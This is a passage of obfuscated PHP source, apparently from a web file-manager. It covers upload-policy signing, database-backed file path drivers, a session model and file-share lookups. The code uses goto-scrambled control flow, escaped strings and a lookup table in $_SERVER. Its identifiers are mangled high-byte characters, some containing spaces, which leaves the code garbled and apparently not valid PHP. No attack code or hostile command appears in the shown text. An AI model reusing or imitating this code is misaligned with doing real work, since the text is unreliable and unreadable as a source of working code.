$C©ß—Êô = array($Eº‡˜ó½†[1147] => $dÖßµ…‡¿Ğ, $Eº‡˜ó½†[1148] => array(array($Eº‡˜ó½†[1149] => $eÊÑ‚‹…øí), array($Eº‡˜ó½†[1150] => $this->bucket), array($Eº‡˜ó½†[1151], $Eº‡˜ó½†[1152], $Eº‡˜ó½†[33]), array($Eº‡˜ó½†[1153] => $Fİè¥ŒÆÏ), array($Eº‡˜ó½†[1154] => $F‰öëÊ†ä¶), array($Eº‡˜ó½†[1155] => $this->accessKey), array($Eº‡˜ó½†[1156] => $b÷ÆÅ××Ç))); $C©ß—Êô = json_encode($C©ß—Êô); $eÎ…’ÓÇáÉ = hash_hmac($Eº‡˜ó½†[226], $b÷ÆÅ××Ç, $this->secret); goto E¼¤‘òØ™‹; aàÓ¤ÂØºÏ: $Fİè¥ŒÆÏ = $Eº‡˜ó½†[1145]; $dÖßµ…‡¿Ğ = gmdate($Eº‡˜ó½†[1146], time() + $Bî‹¯½¼ïé); $b÷ÆÅ××Ç = (string) time() . $Eº‡˜ó½†[67] . (string) (time() + $Bî‹¯½¼ïé); goto D¡†•±‡Æ; Eœó—¾ã·á: $Eº‡˜ó½† =& $_SERVER[úÎü]; $eÊÑ‚‹…øí = $Eº‡˜ó½†[189]; $F‰öëÊ†ä¶ = $Eº‡˜ó½†[226]; goto aàÓ¤ÂØºÏ; Aõß°²è•è: return $D›Ïß„¢ôì; goto Cæ—Å‹ÅÊ; E¼¤‘òØ™‹: $føõÖËàŞ = sha1($C©ß—Êô); $A†ôÜÙ·ã = hash_hmac($Eº‡˜ó½†[226], $føõÖËàŞ, $eÎ…’ÓÇáÉ); $D›Ïß„¢ôì = array($Eº‡˜ó½†[1149] => $eÊÑ‚‹…øí, $Eº‡˜ó½†[1153] => $Fİè¥ŒÆÏ, $Eº‡˜ó½†[1157] => base64_encode($C©ß—Êô), $Eº‡˜ó½†[1154] => $F‰öëÊ†ä¶, $Eº‡˜ó½†[1155] => $this->accessKey, $Eº‡˜ó½†[1158] => $b÷ÆÅ××Ç, $Eº‡˜ó½†[1159] => $A†ôÜÙ·ã, $Eº‡˜ó½†[173] => $this->getHost()); goto Aõß°²è•è; Cæ—Å‹ÅÊ: } public function fileOutLink($A‘ğñÙˆ¡) { $FŒÁöà¦ªĞ =& $_SERVER[úÎü]; if (substr($A‘ğñÙˆ¡, 0, 7) == $FŒÁöà¦ªĞ[1160]) { $A‘ğñÙˆ¡ = $FŒÁöà¦ªĞ[1161] . substr($A‘ğñÙˆ¡, 7); } header($FŒÁöà¦ªĞ[156] . $A‘ğñÙˆ¡); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($fÜˆ†“—äß) { $this->pathParse = $fÜˆ†“—äß; $this->model = Model($_SERVER[úÎü][1162]); } public function getPath($aò‡Ø›ïè”) { return trim($aò‡Ø›ïè”, $_SERVER[úÎü][8]); } public function pathFather($fîã›Êî‰â) { $C‘¸¾Æ¸èù = $this->parse($fîã›Êî‰â); $C‘¸¾Æ¸èù = $this->infoSimple($fîã›Êî‰â); return $C‘¸¾Æ¸èù ? $C‘¸¾Æ¸èù[$_SERVER[úÎü][478]] : !1; } public function pathThis($EÏ³Èˆ ¸ã) { $CÃºÖÏÆ· = $this->infoSimple($EÏ³Èˆ ¸ã); return $CÃºÖÏÆ· ? $CÃºÖÏÆ·[$_SERVER[úÎü][28]] : !1; } public function getPathOuter($F‹·’Í†‘) { if (!$F‹·’Í†‘) { return $F‹·’Í†‘; } $A°¡“Ôô¬Ÿ = $this->parse($F‹·’Í†‘); return KodIO::make($A°¡“Ôô¬Ÿ[$_SERVER[úÎü][383]]); } public function copyFolderFromIO($f÷ŠÊ÷´îˆ, $EÉùæóÇ÷, $fƒ”áÌí¸š, $C›îÔ—¥É, $aÑã¶‡Ä¥) { $FÄ†Û„Äö² = $this->model->copyFolderFromIO($f÷ŠÊ÷´îˆ, $EÉùæóÇ÷, $fƒ”áÌí¸š, $C›îÔ—¥É, $aÑã¶‡Ä¥); return KodIO::make($FÄ†Û„Äö²); } public function isParentOf($a­–ö£İº¯, $CäíÔå¤Ú) { return $this->model->isParentOf($a­–ö£İº¯, $CäíÔå¤Ú); } public function mkfile($e²¢åßËÌâ, $B¥ÙŒ‚‚à´ = '', $Cì—ÉÀÖŒ² = REPEAT_RENAME) { $dø§ä“‚³Â =& $_SERVER[úÎü]; $C¤Áİê¶‡ = $this->parse($e²¢åßËÌâ); $e²¢åßËÌâ = $C¤Áİê¶‡[$dø§ä“‚³Â[383]]; for ($f«Ë¸ğİ¥ö = 0; $f«Ë¸ğİ¥ö < count($C¤Áİê¶‡[$dø§ä“‚³Â[1163]]); $f«Ë¸ğİ¥ö++) { $ešá Ÿ†³ô = $C¤Áİê¶‡[$dø§ä“‚³Â[1163]][$f«Ë¸ğİ¥ö]; if ($f«Ë¸ğİ¥ö == count($C¤Áİê¶‡[$dø§ä“‚³Â[1163]]) - 1) { $e²¢åßËÌâ = $this->model->mkfile($e²¢åßËÌâ, $ešá Ÿ†³ô, $B¥ÙŒ‚‚à´, $Cì—ÉÀÖŒ²); break; } $e²¢åßËÌâ = $this->model->mkdir($e²¢åßËÌâ, $ešá Ÿ†³ô, REPEAT_SKIP); } return $this->getPathOuter($e²¢åßËÌâ); } public function mkdir($C³ŒÅ‘Š¼í, $a’ ò¸– = REPEAT_SKIP) { $d‰öÌØÛ© =& $_SERVER[úÎü]; $cí„Ñ‡¹áÑ = $this->parse($C³ŒÅ‘Š¼í); $C³ŒÅ‘Š¼í = $cí„Ñ‡¹áÑ[$d‰öÌØÛ©[383]]; for ($Cí‡Ş¦½…œ = 0; $Cí‡Ş¦½…œ < count($cí„Ñ‡¹áÑ[$d‰öÌØÛ©[1163]]); $Cí‡Ş¦½…œ++) { $f¯°éĞ–Û¹ = $cí„Ñ‡¹áÑ[$d‰öÌØÛ©[1163]][$Cí‡Ş¦½…œ]; $C³ŒÅ‘Š¼í = $this->model->mkdir($C³ŒÅ‘Š¼í, $f¯°éĞ–Û¹, $a’ ò¸–); } return $this->getPathOuter($C³ŒÅ‘Š¼í); } public function copyFile($dŠˆÆ²¶¶Ü, $A«”‹ö, $bœÊ¬õ¹ğÑ = REPEAT_REPLACE) { $eª„Ÿ¢¦‚ =& $_SERVER[úÎü]; $D®˜‘Û¬¶ó = $this->parse($A«”‹ö); $fã§Á‚„¡¢ = $this->model->copy($dŠˆÆ²¶¶Ü, $D®˜‘Û¬¶ó[$eª„Ÿ¢¦‚[383]], $bœÊ¬õ¹ğÑ, $D®˜‘Û¬¶ó[$eª„Ÿ¢¦‚[75]]); return $fã§Á‚„¡¢ ? $this->getPathOuter($fã§Á‚„¡¢) : !1; } public function moveFile($F†ö¨ÕÁ ê, $bÍ¬À³½Æ°, $BÔ½ŒŸà = REPEAT_REPLACE) { $AÚÅñŸ£õ =& $_SERVER[úÎü]; $dÁä–â¸âã = $this->parse($bÍ¬À³½Æ°); $d‹ˆ™ÉÚ¸Ö = $this->model->move($F†ö¨ÕÁ ê, $dÁä–â¸âã[$AÚÅñŸ£õ[383]], $BÔ½ŒŸà, $dÁä–â¸âã[$AÚÅñŸ£õ[75]]); return $d‹ˆ™ÉÚ¸Ö ? $this->getPathOuter($d‹ˆ™ÉÚ¸Ö) : !1; } public function copy($eÆ­Îñ”¥Ì, $d¶½ˆÆ‰öË, $F‘¾’µ»† = REPEAT_REPLACE) { $C‚…ÓÊµ©å = $this->parse($d¶½ˆÆ‰öË); $E¤²ÏêÒËì = $this->model->copy($eÆ­Îñ”¥Ì, $C‚…ÓÊµ©å[$_SERVER[úÎü][383]], $F‘¾’µ»†); return $E¤²ÏêÒËì ? $this->getPathOuter($E¤²ÏêÒËì) : !1; } public function moveSameAllow() { } public function move($aæãÆ·ªæ›, $E®‚Î”È¦, $dçÑªñÙŒ­ = REPEAT_REPLACE) { $dŠ—ÚŞõ¼Œ = $this->parse($E®‚Î”È¦); $e‰ßŸõ¿‰À = $this->model->move($aæãÆ·ªæ›, $dŠ—ÚŞõ¼Œ[$_SERVER[úÎü][383]], $dçÑªñÙŒ­); return $e‰ßŸõ¿‰À ? $this->getPathOuter($e‰ßŸõ¿‰À) : !1; } public function remove($fì÷Õ·ÃŞƒ, $fæÆ®¾–â¢ = true) { return $this->model->remove($fì÷Õ·ÃŞƒ, $fæÆ®¾–â¢); } public function rename($Dˆ‘·ÛòÆË, $a¦Æ·Å¼©) { $A®„×ÜòŸÉ = $this->model->rename($Dˆ‘·ÛòÆË, $a¦Æ·Å¼©); return $A®„×ÜòŸÉ ? $this->getPathOuter($Dˆ‘·ÛòÆË) : $A®„×ÜòŸÉ; } public function size($eë¼ô²ÈÜù) { $D’¤š¿Õµó = $this->infoSimple($eë¼ô²ÈÜù); return $D’¤š¿Õµó ? $D’¤š¿Õµó[$_SERVER[úÎü][77]] : 0; } public function infoSimple($bÙŒ“ªĞì¡) { return $this->model->sourceInfo($bÙŒ“ªĞì¡); } public function info($bÊ‡æŒÜî) { return $this->infoParse($bÊ‡æŒÜî); } public function infoAuth($eç«¨»ÚØõ) { return $this->infoParse($eç«¨»ÚØõ, !1, !0); } public function infoWithChildren($a‹À¹Ô‰¹) { return $this->infoParse($a‹À¹Ô‰¹, !0); } protected function infoParse($c¡ÙÎ®˜™, $d†…‡Ğé»… = false, $Bâ„èİÛù = false) { if (!$d†…‡Ğé»…) { return $this->model->pathInfo($c¡ÙÎ®˜™, $Bâ„èİÛù); } return $this->model->pathInfoMore($c¡ÙÎ®˜™); } public function infoFull($EÈÍòÁÎº) { $a¥ƒ÷Ì÷ÇÎ =& $_SERVER[úÎü]; $A˜†¦÷‚ñ = explode($a¥ƒ÷Ì÷ÇÎ[8], $EÈÍòÁÎº); $dŸˆ¥¨¥„Ú = implode($a¥ƒ÷Ì÷ÇÎ[8], array_splice($A˜†¦÷‚ñ, 1)); return $this->model->pathInfoByPath($A˜†¦÷‚ñ[0], $dŸˆ¥¨¥„Ú); } public function hashSimple($cøÔ°—á¶) { $fÔÓÅŞ²Ğ =& $_SERVER[úÎü]; $fìÁ†Æİáœ = $this->infoWithChildren($cøÔ°—á¶); return $fìÁ†Æİáœ[$fÔÓÅŞ²Ğ[161]][$fÔÓÅŞ²Ğ[168]]; } public function hashMd5($døõ°–Õ¯ï) { $e¡ƒ½Õ‚´Ú =& $_SERVER[úÎü]; $c±‡‡”Ü¥¥ = $this->infoWithChildren($døõ°–Õ¯ï); return $c±‡‡”Ü¥¥[$e¡ƒ½Õ‚´Ú[161]][$e¡ƒ½Õ‚´Ú[167]]; } public function exist($F×ï‰µ°Ëº) { $CÆ¿Ù èŒ» =& $_SERVER[úÎü]; $eˆğìÊ = $this->parse($F×ï‰µ°Ëº); if (!$eˆğìÊ[$CÆ¿Ù èŒ»[75]]) { return $this->isFile($F×ï‰µ°Ëº) || $this->isFolder($F×ï‰µ°Ëº); } $D„ÊÑ÷°Ãí = array($CÆ¿Ù èŒ»[384] => $eˆğìÊ[$CÆ¿Ù èŒ»[383]], $CÆ¿Ù èŒ»[28] => $eˆğìÊ[$CÆ¿Ù èŒ»[75]]); $B–™¸ªä = $this->model->where($D„ÊÑ÷°Ãí)->find(); return $B–™¸ªä ? !0 : !1; } public function isFile($c¦­ÑéÎŸÎ) { $F‰œÀ–Ã•Š =& $_SERVER[úÎü]; $c…ëª ï§Ç = $this->infoSimple($c¦­ÑéÎŸÎ); return $c…ëª ï§Ç && $c…ëª ï§Ç[$F‰œÀ–Ã•Š[386]] == $F‰œÀ–Ã•Š[83] ? !1 : !0; } public function isFolder($cí„é‰Š¼) { $B‹‰•ãÌğé =& $_SERVER[úÎü]; $BÚëĞñª­İ = $this->infoSimple($cí„é‰Š¼); return $BÚëĞñª­İ && $BÚëĞñª­İ[$B‹‰•ãÌğé[386]] == $B‹‰•ãÌğé[83] ? !0 : !1; } public function listPath($dÛÇáÏ¶”ï, $a‘´“ó§ = false) { $FîñÎí™íØ =& $_SERVER[úÎü]; if ($dÛÇáÏ¶”ï == $FîñÎí™íØ[33]) { return !1; } $A·Ü­„ = array($FîñÎí™íØ[384] => $dÛÇáÏ¶”ï); if ($a‘´“ó§) { return $this->model->listSource($A·Ü­„, -1); } return $this->model->listSource($A·Ü­„); } public function has($eô‹å »ÊÛ, $F…æØÍä¨” = false, $AÒ¶¢Öö¯× = null) { $d×¿’Šø•¦ =& $_SERVER[úÎü]; $EÃ£ÁÇ¦¶§ = $this->infoWithChildren($eô‹å »ÊÛ); if ($F…æØÍä¨”) { return array($d×¿’Šø•¦[200] => $EÃ£ÁÇ¦¶§[$d×¿’Šø•¦[200]], $d×¿’Šø•¦[199] => $EÃ£ÁÇ¦¶§[$d×¿’Šø•¦[199]]); } return $AÒ¶¢Öö¯× ? $EÃ£ÁÇ¦¶§[$d×¿’Šø•¦[200]] : $EÃ£ÁÇ¦¶§[$d×¿’Šø•¦[199]]; } public function listAll($b×µ‹ÑŸÍ) { $FÉç«–µ­ = IO::info($this->pathParse[$_SERVER[úÎü][75]]); if (!$FÉç«–µ­) { return array(); } return $this->model->listAll($b×µ‹ÑŸÍ); } public function getContent($A¯é»›Àáš) { return $this->model->getContent($A¯é»›Àáš); } public function setContent($CğÁ½’Šğ¶, $aƒôÄ‰ºï = '') { return $this->model->setContent($CğÁ½’Šğ¶, $aƒôÄ‰ºï); } public function fileSubstr($eµ†Ëòùˆœ, $D¼Ç³õÉù, $dÃ×Õ–°¾Š) { return $this->model->fileSubstr($eµ†Ëòùˆœ, $D¼Ç³õÉù, $dÃ×Õ–°¾Š); } public function download($cÍñ¾î–®›, $eæãçÚ¢â = '') { $D‚ÕßºØñÃ = get_path_father($eæãçÚ¢â); $aó¶òàÁ®» = get_path_this($eæãçÚ¢â); $FÃãÒƒ‡ = $this->model->fileInfoGet($cÍñ¾î–®›); $eÒÏÏØñ = IO::copy($FÃãÒƒ‡[$_SERVER[úÎü][75]], $D‚ÕßºØñÃ, !1, $aó¶òàÁ®»); return $eÒÏÏØñ; } public function setModifyTime($bÈó†ç™‚, $bĞï¿£éÙ = '') { $this->model->metaSet($bÈó†ç™‚, $_SERVER[úÎü][1164], $bĞï¿£éÙ); } public function upload($DÎ±µŠí»÷, $EÌ›ÙÍìÖ, $DóÉ†î«“ø = false, $Cô±óŠè¿ = REPEAT_REPLACE) { $dƒ›”¬¼ÖÉ =& $_SERVER[úÎü]; $CîŸÙÙ ¹ì = $this->parse($DÎ±µŠí»÷); $D‡Ôšá–‚— = $this->model->addFile($CîŸÙÙ ¹ì[$dƒ›”¬¼ÖÉ[383]], $EÌ›ÙÍìÖ, $CîŸÙÙ ¹ì[$dƒ›”¬¼ÖÉ[75]], $DóÉ†î«“ø, $Cô±óŠè¿); return $this->getPathOuter($D‡Ôšá–‚—); } public function uploadFileByID($AÉ›¬ Ê¢, $a„ç“¿ìÊ«, $dÍ‡Ü”Ã‡) { $fä“ŠêÑ¡ø =& $_SERVER[úÎü]; $eïÚö¼‹¸£ = $this->parse($AÉ›¬ Ê¢); $aÕéÔÜ„ÙÍ = $this->model->addFileByFileID($eïÚö¼‹¸£[$fä“ŠêÑ¡ø[383]], $a„ç“¿ìÊ«, $eïÚö¼‹¸£[$fä“ŠêÑ¡ø[75]], $dÍ‡Ü”Ã‡); return $this->getPathOuter($aÕéÔÜ„ÙÍ); } public function addFileByRemote($cİ‰ç†È, $A¸ÒŸÄƒøÑ, $F¶Ë¢®¶‡ñ = array(), $bñ®ƒ¡¼·¨ = '', $d¿­»Å¹³) { $Aè¦ÓÊ‹Ëá =& $_SERVER[úÎü]; $bã¦œ—ƒ’ = $this->parse($cİ‰ç†È); $bñ®ƒ¡¼·¨ = empty($bñ®ƒ¡¼·¨) ? $bã¦œ—ƒ’[$Aè¦ÓÊ‹Ëá[75]] : $bñ®ƒ¡¼·¨; $c¨¥æëÀ¤ = $this->model->addFileByRemote($bã¦œ—ƒ’[$Aè¦ÓÊ‹Ëá[383]], $A¸ÒŸÄƒøÑ, $bñ®ƒ¡¼·¨, $F¶Ë¢®¶‡ñ, $d¿­»Å¹³); return $this->getPathOuter($c¨¥æëÀ¤); } public function uploadLink($eæÃà¸­¶Ù, $c‘ï´êĞ” = 0) { $FÆŸï¾²çİ =& $_SERVER[úÎü]; $dô®Œİ¾ = $this->parse($eæÃà¸­¶Ù); $eæÃà¸­¶Ù = Model($FÆŸï¾²çİ[560])->createFileName($dô®Œİ¾[$FÆŸï¾²çİ[75]]); $B³—¤òŞÏ = IO::uploadLink($eæÃà¸­¶Ù, $c‘ï´êĞ”); return $B³—¤òŞÏ; } public function fileNameAuto($dòæ£ëÆ»…, $D«ÑŸ©á, $d¸¨ç’¥›¶ = REPEAT_REPLACE, $Fºá­ŸÄÑŠ = false) { return $this->model->fileNameAuto($dòæ£ëÆ»…, $D«ÑŸ©á, $d¸¨ç’¥›¶, $Fºá­ŸÄÑŠ); } public function fileNameExist($f…Ì°ï‚ä¡, $E÷§À´–) { return $this->model->fileNameExist($f…Ì°ï‚ä¡, $E÷§À´–); } protected function _fileOut($DÙ¬Å·’¶®, $bäæ±Ä¾åÅ = false, $e°ëë¢÷¥É = false, $e‰ˆ©İ«Ç˜ = '', $d±õ…„Œ«´ = false) { goto aô†™äª; CæÅ³—Ş³¡: if ($d±õ…„Œ«´) { return IO::fileOutServer($aôŞ‰„¤¸œ[$DäÏøİß˜Š[75]], $bäæ±Ä¾åÅ, $B‡ÇÖ ìšê, $e‰ˆ©İ«Ç˜); } IO::fileOut($aôŞ‰„¤¸œ[$DäÏøİß˜Š[75]], $bäæ±Ä¾åÅ, $B‡ÇÖ ìšê, $e‰ˆ©İ«Ç˜); goto E÷³Ô˜ƒÛî; d£÷ ‡ë™´: $aôŞ‰„¤¸œ = $this->model->fileInfoGet($DÙ¬Å·’¶®); $e‰ˆ©İ«Ç˜ = $aôŞ‰„¤¸œ[$DäÏøİß˜Š[167]] ? $aôŞ‰„¤¸œ[$DäÏøİß˜Š[167]] : $e‰ˆ©İ«Ç˜; $B‡ÇÖ ìšê = isset($GLOBALS[$DäÏøİß˜Š[1166]]) ? $GLOBALS[$DäÏøİß˜Š[1166]] : $F¶²¡œŸÃ‚[$DäÏøİß˜Š[28]]; goto CæÅ³—Ş³¡; aô†™äª: $DäÏøİß˜Š =& $_SERVER[úÎü]; $F¶²¡œŸÃ‚ = $this->model->sourceInfo($DÙ¬Å·’¶®); if ($F¶²¡œŸÃ‚[$DäÏøİß˜Š[386]] == $DäÏøİß˜Š[83]) { header($DäÏøİß˜Š[1165]); die; } goto d£÷ ‡ë™´; E÷³Ô˜ƒÛî: } public function fileOut($Eçè«çæè°, $Fø‹éõÉ›³ = false, $F®ê†Å«Á¹ = false, $Fá¥×¥ë©µ = '') { $this->_fileOut($Eçè«çæè°, $Fø‹éõÉ›³, $F®ê†Å«Á¹, $Fá¥×¥ë©µ); } public function fileOutServer($AšŒ³èÅœ, $F×‹é—ù÷× = false, $A“±Ïôñ = false, $a·õÁ›íó = '') { $this->_fileOut($AšŒ³èÅœ, $F×‹é—ù÷×, $A“±Ïôñ, $a·õÁ›íó, !0); } protected function _fileOutImage($a­¡ĞÇÌ£, $c–Üõ“Ëª = 250) { goto AŒ‘é„ÌŞ¬; D³ŞÊ¼À÷¦: $DïÍÛëî‹ˆ = $this->model->fileInfoGet($a­¡ĞÇÌ£); $DïÍÛëî‹ˆ[$E•³¿æŸ§[28]] = $dÊ“‰Êğ«â[$E•³¿æŸ§[28]]; $DïÍÛëî‹ˆ[$E•³¿æŸ§[160]] = $dÊ“‰Êğ«â[$E•³¿æŸ§[160]]; goto cçÚèÙ¹°„; cçÚèÙ¹°„: $GLOBALS[$E•³¿æŸ§[1166]] = $DïÍÛëî‹ˆ[$E•³¿æŸ§[28]]; $GLOBALS[$E•³¿æŸ§[159]] = $DïÍÛëî‹ˆ; IO::fileOutImage($DïÍÛëî‹ˆ[$E•³¿æŸ§[75]], $c–Üõ“Ëª); goto Dé˜£¹İ®°; AŒ‘é„ÌŞ¬: $E•³¿æŸ§ =& $_SERVER[úÎü]; $dÊ“‰Êğ«â = $this->model->pathInfo($a­¡ĞÇÌ£); if ($dÊ“‰Êğ«â[$E•³¿æŸ§[386]] == $E•³¿æŸ§[83]) { show_json($E•³¿æŸ§[1167] . $a­¡ĞÇÌ£, !1); } goto D³ŞÊ¼À÷¦; Dé˜£¹İ®°: } public function fileOutImage($BÀƒ„Äà, $eĞè¹Şêµİ = 250) { $this->_fileOutImage($BÀƒ„Äà, $eĞè¹Şêµİ); } public function fileOutImageServer($Dèéù£óßá, $C•…µ˜âîÊ = 250) { $this->_fileOutImage($Dèéù£óßá, $C•…µ˜âîÊ); } public function link($DÉˆ‹ë¾µ, $d¨Ï¨ÕÓ´Ö = '') { $E‹´ƒ¸Ù  = $this->model->fileInfoGet($DÉˆ‹ë¾µ); return IO::link($E‹´ƒ¸Ù [$_SERVER[úÎü][75]], $d¨Ï¨ÕÓ´Ö); } protected function parse($EÈ“‘±”‚¤) { $eÀ»öºé =& $_SERVER[úÎü]; if (strstr($EÈ“‘±”‚¤, $eÀ»öºé[8]) === !1) { return array($eÀ»öºé[401] => intval($EÈ“‘±”‚¤), $eÀ»öºé[75] => $eÀ»öºé[33], $eÀ»öºé[1163] => array()); } $C¢ùĞò”ç = explode($eÀ»öºé[8], trim($EÈ“‘±”‚¤, $eÀ»öºé[8])); if (count($C¢ùĞò”ç) < 2) { show_tips($EÈ“‘±”‚¤ . $eÀ»öºé[1168]); } return array($eÀ»öºé[401] => intval($C¢ùĞò”ç[0]), $eÀ»öºé[75] => $C¢ùĞò”ç[1], $eÀ»öºé[1163] => array_slice($C¢ùĞò”ç, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($d‰Ø‰ÌİäÅ) { $this->pathParse = $d‰Ø‰ÌİäÅ; $this->model = Model($_SERVER[úÎü][1162]); } public function getPathOuter($E‡¼‘‡®îÍ) { $FÇÀê‹ãÉò =& $_SERVER[úÎü]; if (!$E‡¼‘‡®îÍ) { return $E‡¼‘‡®îÍ; } $cÓ»æ©ö = $this->parse($E‡¼‘‡®îÍ); return trim(KodIO::makeShare($this->pathParse[$FÇÀê‹ãÉò[383]], $cÓ»æ©ö[$FÇÀê‹ãÉò[383]]), $FÇÀê‹ãÉò[8]); } protected function infoParse($F„Ä„ë™„, $dİ×°î‘†¥ = false, $AïÄ´İ›’Á = false) { $a¥Ù÷¬§Ñé =& $_SERVER[úÎü]; $Eæ«ÉšÜ”´ = $this->pathParse[$a¥Ù÷¬§Ñé[383]]; $B‘¯Œóš = trim($this->pathParse[$a¥Ù÷¬§Ñé[1024]], $a¥Ù÷¬§Ñé[8]); return Action($a¥Ù÷¬§Ñé[1169])->sharePathInfo($Eæ«ÉšÜ”´, $B‘¯Œóš); } public function infoFull($EæŞ‡Ìô¬) { $aºšÛŒ”ğÕ =& $_SERVER[úÎü]; $B¨³Ó¥èîÀ = explode($aºšÛŒ”ğÕ[8], trim($EæŞ‡Ìô¬, $aºšÛŒ”ğÕ[8])); if (count($B¨³Ó¥èîÀ) > 1) { $dÜÚÔÇÃ„ = implode($aºšÛŒ”ğÕ[8], array_splice($B¨³Ó¥èîÀ, 1)); $EÇº¾°İ´ = $this->model->pathInfoByPath($B¨³Ó¥èîÀ[0], $dÜÚÔÇÃ„); if (!$EÇº¾°İ´) { return !1; } $this->pathParse[$aºšÛŒ”ğÕ[1024]] = $EÇº¾°İ´[$aºšÛŒ”ğÕ[385]]; } return $this->infoParse($EæŞ‡Ìô¬); } public function listAll($bÈ¬æó”³Û) { goto cËäŒŞ¦ê×; c²à¼İ¨˜ê: $c†¿ê“Æãº = $this->model->listAll($bÈ¬æó”³Û); $b®¯ô§® = Model($aæĞÇï£›¶[552])->getInfo($dïÆì¯¸¼Û[$aæĞÇï£›¶[456]]); $c£ƒİ›ºÑ = Action($aæĞÇï£›¶[1169]); goto E§ãˆ Ø• ; E§ãˆ Ø• : foreach ($c†¿ê“Æãº as &$Cƒ’›Ã¹·ö) { check_abort(); $Cƒ’›Ã¹·ö[$aæĞÇï£›¶[407]] = $c£ƒİ›ºÑ->_shareItemeParse($Cƒ’›Ã¹·ö[$aæĞÇï£›¶[407]], $b®¯ô§®); } unset($Cƒ’›Ã¹·ö); return $c†¿ê“Æãº; goto A¢‘ÊÆëÅ; cËäŒŞ¦ê×: $aæĞÇï£›¶ =& $_SERVER[úÎü]; $dïÆì¯¸¼Û = IO::info($this->pathParse[$aæĞÇï£›¶[75]]); if (!$dïÆì¯¸¼Û) { return array(); } goto c²à¼İ¨˜ê; A¢‘ÊÆëÅ: } } goto F°çµ›Æì; AµÖ†¿ßÑˆ: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\155\x5f\x73\145\x73\x73\151\157\x6e"; public function get($aÚ•‡øè©õ) { $bÒ¦’™Í³¥ =& $_SERVER[úÎü]; $Fšİ’•ª¼İ = $this->where(array($bÒ¦’™Í³¥[1766] => $aÚ•‡øè©õ))->find(); if (!is_array($Fšİ’•ª¼İ)) { return !1; } return $Fšİ’•ª¼İ[$bÒ¦’™Í³¥[693]]; } public function set($dª¤ŒÓ……å, $Eâ‚±íÓºå, $C“Ëà¦®ÁË = 3600) { $a‚—«œ…ÈÛ =& $_SERVER[úÎü]; $a§ØğÚ½îµ = array($a‚—«œ…ÈÛ[1766] => $dª¤ŒÓ……å, $a‚—«œ…ÈÛ[1678] => $Eâ‚±íÓºå, $a‚—«œ…ÈÛ[1767] => $C“Ëà¦®ÁË + time()); if (Session::get($a‚—«œ…ÈÛ[1768])) { $a§ØğÚ½îµ[$a‚—«œ…ÈÛ[1485]] = Session::get($a‚—«œ…ÈÛ[1768]); } else { $a§ØğÚ½îµ[$a‚—«œ…ÈÛ[1485]] = 0; } if ($this->get($dª¤ŒÓ……å)) { return $this->where(array($a‚—«œ…ÈÛ[1766] => $dª¤ŒÓ……å))->save($a§ØğÚ½îµ); } else { return $this->add($a§ØğÚ½îµ, array(), !0); } } public function remove($D§ë “åê‰) { return $this->where(array($_SERVER[úÎü][1766] => $D§ë “åê‰))->delete(); } public function clearTimeout() { return $this->where($_SERVER[úÎü][1769] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\151\x6e\163\x65\x72\164\54\x75\x70\144\x61\164\x65", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\x63\x72\145\x61\x74\x65\124\151\155\145", "\164\151\155\145", "\151\x6e\x73\x65\162\x74", "\146\165\x6e\143\164\151\x6f\x6e"), array("\157\x70\164\151\x6f\x6e\163", '', "\x69\156\163\x65\162\164\54\x75\160\144\141\x74\x65\54\x73\x65\154\145\x63\164", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($F¦„Çœ­à‹) { $cùìíà¥·‰ =& $_SERVER[úÎü]; $B•¬·¿¬Õé = isset($F¦„Çœ­à‹[0]) ? $F¦„Çœ­à‹[0] : !1; return array($cùìíà¥·‰[1770] => array(USER_ID, $cùìíà¥·‰[1771]), $cùìíà¥·‰[1719] => array($B•¬·¿¬Õé, $cùìíà¥·‰[1772])); } protected function listSimple() { $E¸î÷Ëî = array($_SERVER[úÎü][1485] => USER_ID); $C­®—‹‚Œ = $this->field($this->fieldList)->where($E¸î÷Ëî)->select(); return $C­®—‹‚Œ ? $C­®—‹‚Œ : array(); } protected function getInfo($f£³†É›•ò, $CÑ’™´Å = false) { $b´ŒÕÛÒÃ =& $_SERVER[úÎü]; if ($CÑ’™´Å) { return $this->_getShareInfo(array($b´ŒÕÛÒÃ[456] => $f£³†É›•ò)); } $eóŠ‹®ñ = $this->cacheFunctionGet($b´ŒÕÛÒÃ[1773], $f£³†É›•ò); return $eóŠ‹®ñ; } public function getInfoByHash($FÇï¥†Ÿ³©) { return $this->_getShareInfo(array($_SERVER[úÎü][458] => $FÇï¥†Ÿ³©)); } public function getInfoByPath($DÃ¨¯’÷í…) { $Fƒ‰Š‰Ãƒ¨ =& $_SERVER[úÎü]; $f«‡ÍÖè± = array($Fƒ‰Š‰Ãƒ¨[1485] => USER_ID, $Fƒ‰Š‰Ãƒ¨[385] => $DÃ¨¯’÷í…); return $this->_getShareInfo($f«‡ÍÖè±); } public function getInfoBySourcePath($b®ŠÜ˜”Šˆ) { $Fš‰‰¹‡µÕ =& $_SERVER[úÎü]; $eŒ·¹¡…¹á = array($Fš‰‰¹‡µÕ[1485] => USER_ID, $Fš‰‰¹‡µÕ[1031] => $b®ŠÜ˜”Šˆ); return $this->_getShareInfo($eŒ·¹¡…¹á); } private function _getShareInfo($DïâÉÏ‘¡ì) { goto CÔ—£×îíæ; A›èô”öÖï: if ($Cˆ‚¢”˜ó[$CÂ¸ƒÙùŠ»[385]] == $CÂ¸ƒÙùŠ»[485]) { $Cˆ‚¢”˜ó[$CÂ¸ƒÙùŠ»[407]] = IO::info($Cˆ‚¢”˜ó[$CÂ¸ƒÙùŠ»[1031]]); } else { $Cˆ‚¢”˜ó[$CÂ¸ƒÙùŠ»[407]] = Model($CÂ¸ƒÙùŠ»[1162])->pathInfo($Cˆ‚¢”˜ó[$CÂ¸ƒÙùŠ»[385]]); } $Cˆ‚¢”˜ó[$CÂ¸ƒÙùŠ»[1775]] = $aïêò×Œ²ˆ; return $Cˆ‚¢”˜ó; goto aĞºîĞ„­; a†‹†‹í§: $DïâÉÏ‘¡ì = array($CÂ¸ƒÙùŠ»[456] => $Cˆ‚¢”˜ó[$CÂ¸ƒÙùŠ»[456]]); $a‘Ÿí£óÅ = $CÂ¸ƒÙùŠ»[1774]; 